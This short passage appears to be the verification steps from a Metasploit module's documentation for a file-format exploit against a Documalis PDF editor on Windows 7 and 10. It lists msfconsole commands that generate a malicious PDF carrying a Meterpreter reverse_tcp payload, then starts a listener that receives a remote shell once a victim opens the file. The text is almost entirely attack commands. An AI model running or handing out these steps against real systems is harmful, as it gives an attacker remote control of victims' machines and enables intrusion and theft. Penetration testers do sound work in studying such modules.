Targets Win 7 and Win 10

Verification
use exploit/windows/fileformat/documalis_pdf_editor
set payload windows/meterpreter/reverse_tcp
set lhost (IP of Local Host)
run

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost (IP of Local Host)
run
Open PDF file and the vulnerability is triggered.
